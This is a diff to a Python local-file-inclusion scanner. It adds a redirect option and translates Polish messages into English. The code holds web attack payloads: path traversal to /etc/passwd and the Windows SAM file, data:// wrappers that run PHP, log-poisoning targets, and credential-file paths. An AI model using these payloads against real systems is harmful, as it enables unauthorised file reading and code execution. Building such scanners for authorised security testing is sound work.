@@ -21,10 +21,11 @@ class Color:
     END = '\033[0m'
 
 class LFIWrapperScanner:
-    def __init__(self, proxy: str = None, target_dir: str = None):
+    def __init__(self, proxy: str = None, target_dir: str = None, follow_redirects: bool = False):
         self.proxy = self._setup_proxy(proxy)
         self.target_dir = target_dir
         self.detected_php_version = None
+        self.follow_redirects = follow_redirects
         
         self.session = requests.Session()
         self.session.headers.update({
@@ -44,7 +45,7 @@ class LFIWrapperScanner:
         env_proxies = ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy']
         for env_var in env_proxies:
             if env_proxy := os.getenv(env_var):
-                self.print_status(f"Detected env proxy.", 'info')
+                self.print_status("Detected env proxy.", 'info')
                 return {'http': env_proxy, 'https': env_proxy}
         
         return None
@@ -91,7 +92,7 @@ class LFIWrapperScanner:
         for php_file in php_info_files:
             try:
                 test_url = target_url.rstrip('/') + php_file
-                response = self.session.get(test_url, timeout=3, verify=False)
+                response = self.session.get(test_url, timeout=3, verify=False, allow_redirects=self.follow_redirects)
                 
                 if response.status_code == 200:
                     version_patterns = [
@@ -115,7 +116,7 @@ class LFIWrapperScanner:
                 pass
         
         try:
-            response = self.session.get(target_url, timeout=3, verify=False)
+            response = self.session.get(target_url, timeout=3, verify=False, allow_redirects=self.follow_redirects)
             for header in version_headers:
                 if header in response.headers:
                     header_value = response.headers[header]
@@ -362,14 +363,11 @@ class LFIWrapperScanner:
             'database.php.bak',
         ]
         
-        # Add advanced payloads from real cases
         advanced_payloads = self.generate_advanced_wrappers()
         test_files.extend(advanced_payloads)
         
-        # target dir flag 
         if self.target_dir:
             test_files.insert(0, self.target_dir)
-            # path traversal
             for traversal in traversal_payloads[:5]:
                 test_files.append(traversal + self.target_dir.lstrip('/'))
         
@@ -384,7 +382,7 @@ class LFIWrapperScanner:
             'data://text/php;base64,' + test_content,
             'data://text/php,' + urllib.parse.quote("<?php echo 'VULNERABLE'; ?>"),
             'data://,<?php echo "TEST"; ?>',
-            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',  # phpinfo()
+            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
         ]
         
         expect_wrappers = [
@@ -452,7 +450,6 @@ class LFIWrapperScanner:
     def generate_advanced_wrappers(self):
         advanced_payloads = []
         
-        # Case 1: Double encoding & special chars
         double_encoded = [
             '....//....//....//....//....//etc/passwd',
             '..%255c..%255c..%255c..%255cwindows\\win.ini',
@@ -460,7 +457,6 @@ class LFIWrapperScanner:
             '..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
         ]
         
-        # Case 2: Windows-specific paths
         windows_paths = [
             '..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
             'c:\\windows\\system32\\config\\sam',
@@ -468,7 +464,6 @@ class LFIWrapperScanner:
             '..//..//..//..//..//windows/win.ini',
         ]
         
-        # Case 3: Log poisoning pre-work
         log_poisoning = [
             '/var/log/apache2/access.log',
             '/var/log/nginx/access.log', 
@@ -478,7 +473,6 @@ class LFIWrapperScanner:
             'C:\\xampp\\apache\\logs\\access.log',
         ]
         
-        # Case 4: Configuration files
         config_files = [
             '/.htpasswd',
             '/.git/config',
@@ -489,7 +483,6 @@ class LFIWrapperScanner:
             '/etc/apache2/.htpasswd',
         ]
         
-        # Case 5: Session hijacking
         session_files = [
             '/tmp/sess_1234567890',
             '/var/lib/php5/sess_1234567890',
@@ -538,7 +531,6 @@ class LFIWrapperScanner:
         return version_specific
 
     def verify_vulnerability(self, content: str, wrapper: str):
-        # False positive reduction
         false_positives = [
             '<!DOCTYPE html>',
             '<html',
@@ -554,7 +546,6 @@ class LFIWrapperScanner:
             'Page not found',
         ]
         
-        # confirm false-postiive
         content_lower = content.lower()
         if any(fp.lower() in content_lower for fp in false_positives[:5]):
             return None
@@ -592,10 +583,6 @@ class LFIWrapperScanner:
             'PWD=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
             'HOME=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
             'PHP Version': {'confidence': 'high', 'type': 'RCE', 'file': 'phpinfo'},
-        }
-        
-        # Additional indicators from real reports
-        additional_indicators = {
             'database_password': {'confidence': 'high', 'type': 'LFI', 'file': 'config file'},
             'API_KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'environment file'},
             'SECRET_KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'secret key'},
@@ -604,26 +591,21 @@ class LFIWrapperScanner:
             '-----BEGIN PRIVATE KEY-----': {'confidence': 'high', 'type': 'LFI', 'file': 'private key'},
         }
         
-        indicators.update(additional_indicators)
-        
         for pattern, info in indicators.items():
             if pattern in content:
                 return info
         
-        # base64
         if len(content) > 20 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\n\r' for c in content[:200]):
             try:
                 decoded = base64.b64decode(content[:400]).decode('utf-8', errors='ignore')
                 for pattern, info in indicators.items():
                     if pattern in decoded:
                         return info
-                # decode base64 
                 if 'root:' in decoded or '<?php' in decoded or 'Linux' in decoded:
                     return {'confidence': 'medium', 'type': 'LFI', 'file': 'base64 encoded content'}
             except:
                 pass
         
-        # ROT13
         def rot13(text):
             result = []
             for char in text:
@@ -655,15 +637,14 @@ class LFIWrapperScanner:
         return None
 
     def enhanced_verify_vulnerability(self, content: str, wrapper: str, response):
-    
         verification = self.verify_vulnerability(content, wrapper)
         if not verification:
             return None
 
         suspicious_headers = {
-            'X-Powered-By': 'Ujawnia technologię backendu',
-            'Server': 'Ujawnia wersję serwera',
-            'X-Debug-Token': 'Tryb debugowania włączony',
+            'X-Powered-By': 'Reveals backend technology',
+            'Server': 'Reveals server version',
+            'X-Debug-Token': 'Debug mode enabled',
         }
     
         header_info = []
@@ -677,43 +658,42 @@ class LFIWrapperScanner:
         return verification
 
     def generate_reproduction_steps(self, target_url: str, parameter: str, wrapper: str, verification_info: dict):
-    
         separator = '&' if '?' in target_url else '?'
         encoded_payload = urllib.parse.quote(wrapper)
         full_url = f"{target_url}{separator}{parameter}={encoded_payload}"
     
         steps = [
-            f"{Color.BOLD}Kroki do odtworzenia:{Color.END}",
-            f"1. {Color.GREEN}Wykonaj zapytanie:{Color.END}",
+            f"{Color.BOLD}Reproduction Steps:{Color.END}",
+            f"1. {Color.GREEN}Execute request:{Color.END}",
             f"   {Color.CYAN}curl -k '{full_url}'{Color.END}",
-            f"   {Color.CYAN}lub{Color.END}",
+            f"   {Color.CYAN}or{Color.END}",
             f"   {Color.CYAN}wget --no-check-certificate '{full_url}'{Color.END}",
             "",
-            f"2. {Color.GREEN}W przeglądarce:{Color.END}",
+            f"2. {Color.GREEN}In browser:{Color.END}",
             f"   {Color.CYAN}{full_url}{Color.END}",
             "",
-            f"3. {Color.GREEN}Uzasadnienie:{Color.END}",
+            f"3. {Color.GREEN}Justification:{Color.END}",
         ]
     
         if wrapper.startswith('php://filter'):
-            steps.append(f"   {Color.YELLOW}PHP filter wrapper pozwala na odczyt plików poprzez konwersję base64{Color.END}")
-            steps.append(f"   {Color.YELLOW}Skrypt ominął restrykcje dostępu do systemu plików{Color.END}")
+            steps.append(f"   {Color.YELLOW}PHP filter wrapper allows file reading through base64 conversion{Color.END}")
+            steps.append(f"   {Color.YELLOW}Script bypassed file system access restrictions{Color.END}")
         elif wrapper.startswith('data://'):
-            steps.append(f"   {Color.YELLOW}Data wrapper umożliwia wykonanie kodu PHP poprzez data URI{Color.END}")
-            steps.append(f"   {Color.YELLOW}Serwer przetwarza zawartość data:// jako kod PHP{Color.END}")
+            steps.append(f"   {Color.YELLOW}Data wrapper enables PHP code execution via data URI{Color.END}")
+            steps.append(f"   {Color.YELLOW}Server processes data:// content as PHP code{Color.END}")
         elif wrapper.startswith('expect://'):
-            steps.append(f"   {Color.YELLOW}Expect wrapper wykonuje polecenia systemowe{Color.END}")
-            steps.append(f"   {Color.YELLOW}Demonstruje to zdalne wykonanie kodu (RCE){Color.END}")
+            steps.append(f"   {Color.YELLOW}Expect wrapper executes system commands{Color.END}")
+            steps.append(f"   {Color.YELLOW}Demonstrates remote code execution (RCE){Color.END}")
         elif '/etc/passwd' in wrapper or 'etc/passwd' in wrapper:
-            steps.append(f"   {Color.YELLOW}Udane odczytanie /etc/passwd potwierdza LFI{Color.END}")
-            steps.append(f"   {Color.YELLOW}Path traversal pozwala na dostęp poza katalog root{Color.END}")
+            steps.append(f"   {Color.YELLOW}Successful reading of /etc/passwd confirms LFI{Color.END}")
+            steps.append(f"   {Color.YELLOW}Path traversal allows access outside root directory{Color.END}")
         elif 'proc/self' in wrapper:
-            steps.append(f"   {Color.YELLOW}Dostęp do /proc/self ujawnia informacje o procesie{Color.END}")
-            steps.append(f"   {Color.YELLOW}Może prowadzić do ujawnienia zmiennych środowiskowych{Color.END}")
+            steps.append(f"   {Color.YELLOW}Access to /proc/self reveals process information{Color.END}")
+            steps.append(f"   {Color.YELLOW}Can lead to environment variables disclosure{Color.END}")
     
         steps.extend([
             "",
-            f"4. {Color.GREEN}Wpływ:{Color.END}",
+            f"4. {Color.GREEN}Impact:{Color.END}",
             f"   {Color.RED}{verification_info['type']} - {self.get_impact_description(verification_info['type'])}{Color.END}",
         ])
     
@@ -721,15 +701,14 @@ class LFIWrapperScanner:
 
     def get_impact_description(self, vuln_type: str):
         impacts = {
-            'LFI': 'Local File Inclusion - odczyt poufnych plików systemowych',
-            'RCE': 'Remote Code Execution - wykonanie dowolnego kodu na serwerze',
-            'RFI': 'Remote File Inclusion - załadowanie zdalnego pliku',
-            'Directory Traversal': 'Przeglądanie dowolnych katalogów',
+            'LFI': 'Local File Inclusion - reading sensitive system files',
+            'RCE': 'Remote Code Execution - executing arbitrary code on server',
+            'RFI': 'Remote File Inclusion - loading remote files',
+            'Directory Traversal': 'Browsing arbitrary directories',
         }
-        return impacts.get(vuln_type, 'Nieznany typ podatności')
+        return impacts.get(vuln_type, 'Unknown vulnerability type')
 
     def generate_report(self, target_url: str, parameter: str, vulnerabilities: list):
-    
         report = [
             f"# LFI Vulnerability Report",
             f"Target: {target_url}",
@@ -765,7 +744,6 @@ class LFIWrapperScanner:
         return "\n".join(report)
 
     def save_report(self, report: str, filename: str = None):
-        """Zapisuje raport do pliku"""
         if not filename:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"lfi_scan_report_{timestamp}.md"
@@ -780,7 +758,7 @@ class LFIWrapperScanner:
         test_url = f"{target_url}{separator}{parameter}={urllib.parse.quote(wrapper)}"
     
         try:
-            response = self.session.get(test_url, timeout=5, verify=False)
+            response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=self.follow_redirects)
         
             if response.status_code == 200 and len(response.text) > 0:
                 verification = self.enhanced_verify_vulnerability(response.text, wrapper, response)
@@ -789,7 +767,6 @@ class LFIWrapperScanner:
                     self.print_status(f"✓ VULNERABLE - Parameter: {parameter}", 'success')
                     self.print_status(f"  → Type: {verification['type']} | Confidence: {verification['confidence']} | File: {verification['file']}", 'verified')
                 
-                    # Pokaz kroki reprodukcji
                     reproduction_steps = self.generate_reproduction_steps(target_url, parameter, wrapper, verification)
                     print(reproduction_steps)
                 
@@ -819,6 +796,10 @@ class LFIWrapperScanner:
             self.print_status(f"Using proxy: {self.proxy}", 'info')
         if self.target_dir:
             self.print_status(f"Target directory: {self.target_dir}", 'info')
+        if self.follow_redirects:
+            self.print_status("Follow redirects: ENABLED", 'info')
+        else:
+            self.print_status("Follow redirects: DISABLED", 'info')
         self.print_status("SSL verification: DISABLED (self-signed certs supported)", 'info')
         print("-" * 60)
     
@@ -841,7 +822,7 @@ class LFIWrapperScanner:
         print("-" * 60)
     
         try:
-            response = self.session.get(target_url, timeout=5, verify=False)
+            response = self.session.get(target_url, timeout=5, verify=False, allow_redirects=self.follow_redirects)
             self.print_status(f"Initial connection: HTTP {response.status_code}", 'info')
         except Exception as e:
             self.print_status(f"Connection failed: {e}", 'error')
@@ -884,15 +865,13 @@ class LFIWrapperScanner:
         print(banner)
 
 def main():
-    scanner = LFIWrapperScanner()
-    scanner.show_banner()
-    
     parser = argparse.ArgumentParser(description='LFI Wrapper Scanner')
     parser.add_argument('url', help='Target URL')
     parser.add_argument('param', help='Parameter to test')
     parser.add_argument('--proxy', '-p', help='Proxy (http://proxy:port)')
     parser.add_argument('--target-dir', '-t', help='Target directory for wrapper traversal')
     parser.add_argument('--no-report', action='store_true', help='Disable report generation')
+    parser.add_argument('--follow-redirects', '-fr', action='store_true', help='Follow HTTP redirects')
     
     if len(sys.argv) == 1:
         parser.print_help()
@@ -900,7 +879,8 @@ def main():
     
     args = parser.parse_args()
     
-    scanner = LFIWrapperScanner(proxy=args.proxy, target_dir=args.target_dir)
+    scanner = LFIWrapperScanner(proxy=args.proxy, target_dir=args.target_dir, follow_redirects=args.follow_redirects)
+    scanner.show_banner()
     
     if args.proxy:
         scanner.proxy = {'http': args.proxy, 'https': args.proxy}
